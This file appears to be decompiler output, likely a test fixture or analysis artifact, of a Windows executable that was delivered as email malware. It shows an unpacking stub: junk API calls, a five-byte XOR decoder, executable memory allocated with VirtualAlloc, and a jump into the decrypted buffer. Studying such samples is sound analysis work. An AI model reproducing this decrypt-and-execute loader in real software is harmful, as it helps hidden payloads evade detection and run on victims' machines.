// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0530/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

word32 fn1310D000(word32 dwArg04, word32 dwArg08, word32 dwArg0C, word32 dwArg10, word32 dwArg14, word32 dwArg18)
{
	*dwArg10 = dwArg0C;
	word32 ebx_16 = dwArg14;
	Eq_10 * dwArg08_109 = dwArg08 + dwArg14;
	dwArg0C = dwArg0C - 0x00000001;
	while (dwArg0C != 0x00000000)
	{
		AddAtomW(0xB8000000);
		ebx_16 = (word32) ((int32) wLoc1C)[dwArg18];
		dwArg04->b0000 = (byte) ((int32) dwArg08_109->b0000 ^ ebx_16);
		wLoc1C = (word16) ((word32) wLoc1C + 0x00000001);
		if ((int32) wLoc1C == 0x00000005)
			wLoc1C = 0x0000;
		dwArg04 = dwArg04 + 1;
		dwArg08_109 = dwArg08_109 + 1;
		dwArg0C = dwArg0C - 0x00000001;
	}
	return ebx_16;
}

void fn1310D0A9(word32 edx, word32 ebp)
{
	InitCommonControls();
	GetLastError();
	ImageList_DragEnter(0x00BD0000, 0x0AA00000, 0x00000268);
	AddAtomW(0x00080000);
	word32 ecx_36 = ImageList_Draw(0x00234000, 0x00460000, 0x40000000, 0x00023C00, 0x000D6000, 0x0003F400) + edx;
	Eq_86 * v11_43 = (ecx_36 ^ 0x800401F0) + 0x930CE14A;
	word32 esi_47 = v11_43->dw0000;
	word32 esp_418 = fp - 0x000002E0;
	if ((ecx_36 ^ 0x800401F0) != 0x800401F0)
	{
		Mem419[fp - 0x000002E4:word32] = 0x00000000;
		esp_418 = fp - 0x000002E4;
	}
	Eq_102 * esp_59 = esp_418 - 0x00000004;
	esp_59->t0000 = fp - 0x00000010;
	esp_59->t0004.u0 = 0x00000004;
	Mem65[esp_59 - 0x00000008:word32] = fp + 0xFFFFFDC4;
	Mem68[esp_59 - 0x0000000C:word32] = fp + 0xFFFFFDC4;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	word32 eax_81 = v11_43->dw0004;
	Mem85[esp_59 + 0x00000008:word32] = fp + 0xFFFFFDCC;
	esp_59->t0004.u0 = 0x00000004;
	esp_59->t0000 = fp - 0x00000010;
	esp_59->t0004.u0 = 0x00000004;
	Mem97[esp_59 - 0x00000008:word32] = fp + 0xFFFFFDA4;
	Mem100[esp_59 - 0x0000000C:word32] = fp + 0xFFFFFDA8;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	ui32 esi_104 = v11_43->dw0008;
	Mem108[esp_59 + 0x00000008:word32] = fp + 0xFFFFFDCC;
	esp_59->t0004.u0 = 0x00000008;
	esp_59->t0000 = fp - 0x00000010;
	esp_59->t0004.u0 = 0x00000004;
	esp_59->t0008.u0 = fp - 0x0000001C;
	esp_59->t0008.u0 = fp - 0x00000014;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	word32 eax_136 = v11_43->dw000C;
	Mem140[esp_59 + 0x00000008:word32] = fp + 0xFFFFFDCC;
	esp_59->t0004.u0 = 0x0000000C;
	esp_59->t0000 = fp - 0x00000010;
	esp_59->t0004.u0 = 0x00000004;
	esp_59->t0008.u0 = fp - 0x00000028;
	esp_59->t0008.u0 = fp - 0x0000001C;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	word32 dwLoc0248_170 = v11_43->dw0010;
	Mem173[esp_59 + 0x00000008:word32] = fp + 0xFFFFFDCC;
	esp_59->t0004.u0 = 0x00000010;
	esp_59->t0000 = fp - 0x00000010;
	esp_59->t0004.u0 = 0x00000004;
	Mem186[esp_59 - 0x00000008:word32] = fp + 0xFFFFFDA8;
	Mem189[esp_59 - 0x0000000C:word32] = fp + 0xFFFFFDB8;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	esp_59->t0008.u0 = 0x00000040;
	esp_59->t0004.u0 = 0x00003000;
	word32 edx_199 = esi_104 * 0x00000008 + 0x0000000C;
	word32 v15_208 = edx_199 + eax_81;
	Eq_106 v16_211 = v15_208 + esi_47;
	esp_59->t0000 = v16_211;
	Mem219[esp_59 - 0x00000004:word32] = (ecx_36 ^ 0x800401F0) - 0x800401F0;
	word32 dwLoc024C_194 = 0x00000014;
	Eq_303 * dwLoc24_197 = &v11_43->t0014;
	Eq_306 * eax_220 = VirtualAlloc(esp_59->t0004, esp_59->t0000, esp_59->t0004, esp_59->t0008);
	word32 esp_221 = &esp_59->t0008;
	Eq_328 * dwLoc0C_227 = eax_136 + 0x13100000 + edx_199;
	word32 dwLoc0264_231 = edx_199;
	ui32 dwLoc08_232 = 0x00000000;
	word32 dwLoc18_233 = 0x00000000;
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc0264_231 == dwLoc0248_170)
		{
			ui32 edi_346 = dwLoc08_232 + 0x00000001;
			dwLoc08_232 = edi_346;
			if (edi_346 == esi_104)
				goto l1310D46A;
			word32 edi_352 = dwLoc24_197->dw0000;
			Eq_425 * esp_355 = esp_221 - 0x00000004;
			esp_355->dw0000 = &fp->tFFFFFDCC;
			esp_355->dw0000 = dwLoc024C_194;
			esp_355->dw0000 = fp - 0x00000010;
			esp_355->dw0000 = 0x00000004;
			esp_355->dw0000 = fp - 0x0000001C - dwLoc024C_194;
			esp_355->dw0000 = fp - 0x0000001C;
			fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			Eq_458 * eax_382 = &dwLoc24_197->t0004;
			dwLoc0248_170 = eax_382->dw0000;
			esp_355->dw0000 = &fp->tFFFFFDCC;
			word32 eax_379 = dwLoc024C_194 + 0x00000004;
			esp_355->dw0000 = eax_379;
			esp_355->dw0000 = fp - 0x00000010;
			esp_355->dw0000 = 0x00000004;
			esp_355->dw0000 = &fp->dwFFFFFD1C - eax_379;
			esp_355->dw0000 = &fp->dwFFFFFD1C;
			fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			esp_221 = &esp_355->dw0000;
			dwLoc024C_194 = eax_379 + 0x00000004;
			dwLoc24_197 = eax_382 + 0x00000004;
			dwLoc0264_231 = 0x00000000;
			dwLoc0C_227 = edi_352 + 0x13100000;
			goto l1310D425;
		}
l1310D425:
		eax_220->b0000 = dwLoc0C_227->b0000;
		dwLoc0C_227 = dwLoc0C_227 + 1;
		dwLoc18_233 = dwLoc18_233 + 0x00000001;
		dwLoc0264_231 = dwLoc0264_231 + 0x00000001;
	}
l1310D46A:
	Eq_342 * esp_258 = esp_221 - 0x00000004;
	Mem259[esp_258 + 0x00000000:word32] = fp + 0xFFFFFDCC;
	esp_258->ptr0000 = edx_199;
	esp_258->ptr0000 = &fp->dwFFFFFD1C;
	esp_258->ptr0000 = eax_81;
	Mem273[esp_258 - 0x00000010:word32] = eax_220 - edx_199;
	Mem276[esp_258 - 0x00000014:word32] = eax_220;
	word32 ebx_277 = fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	esp_258->ptr0000 = fp;
	esp_258->ptr0000 = &fp->tFFFFFDCC;
	esp_258->ptr0000 = eax_81;
	esp_258->ptr0000 = esi_47;
	Mem298[esp_258 - 0x00000010:word32] = eax_220;
	Eq_306 * edx_300 = eax_220 + eax_81;
	Mem303[esp_258 - 0x00000014:word32] = edx_300;
	(eax_220 + 0x00000F50)();
	esp_258->ptr0000 = 0x00000000;
	ExitProcess(esp_258->ptr0000);
	return;
}

